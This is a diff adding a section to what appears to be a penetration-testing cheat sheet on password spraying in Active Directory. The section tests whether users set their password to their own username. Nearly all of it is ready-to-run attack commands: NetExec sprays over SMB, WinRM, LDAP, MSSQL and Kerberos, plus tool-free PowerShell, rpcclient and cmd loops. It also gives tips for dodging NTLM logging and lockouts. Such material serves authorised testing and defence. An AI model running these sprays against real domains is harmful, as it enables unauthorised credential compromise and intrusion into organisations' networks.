@@ -470,6 +470,59 @@ nxc vnc <TARGET> -p '<PASS>'
 nxc smb <SUBNET>/24 -u users.txt -p pass.txt --continue-on-success 2>/dev/null | grep '\[+\]'
 ```
 
+### Username-as-Password Spray
+
+Common in fresh AD enrollments and lazy password resets — users set their password to their own username (or a trivial variant). Pass the same user list as both `-u` and `-p` so each user is tested with their own name as the password.
+
+```bash
+# Exact username = password (e.g. jsmith:jsmith)
+nxc smb <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+# --no-bruteforce pairs line-by-line (user1:pass1, user2:pass2) instead of cartesian product
+# Without it, nxc tests every user against every password = N^2 attempts + lockout risk
+
+# WinRM validation for confirmed hits
+nxc winrm <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+# LDAP (useful when SMB signing blocks relay but you need to confirm creds)
+nxc ldap <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+# MSSQL variant (service accounts often have username=password)
+nxc mssql <TARGET> -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+# Kerberos auth variant (avoids NTLM logging)
+nxc smb <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success -k
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# PowerShell — username-as-password spray via LDAP bind (no tools, no RSAT)
+$users = Get-Content users.txt
+foreach ($u in $users) {
+    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<DC_IP>","<DOMAIN>\$u","$u")
+    if ($de.distinguishedName) {
+        Write-Host "[+] $u : $u" -ForegroundColor Green
+    }
+    $de.Dispose()
+    Start-Sleep -Seconds 2
+}
+```
+
+```bash
+# Bash + rpcclient — username-as-password (Linux LOTL, no nxc needed)
+while read -r u; do
+  rpcclient -U "${u}%${u}" <DC_IP> -c "getusername" 2>/dev/null | grep -q "Account Name" \
+    && echo "[+] ${u}:${u}"
+  sleep 2
+done < users.txt
+```
+
+```cmd
+:: Windows cmd — net use username-as-password spray (no PowerShell, no tools)
+for /F "tokens=*" %u in (users.txt) do @net use \\<DC_IP>\IPC$ /user:<DOMAIN>\%u %u >nul 2>&1 && echo [+] %u:%u & net use \\<DC_IP>\IPC$ /delete >nul 2>&1
+```
+
 ---
 
 ## Phase 7: Kerberos-Specific Spraying
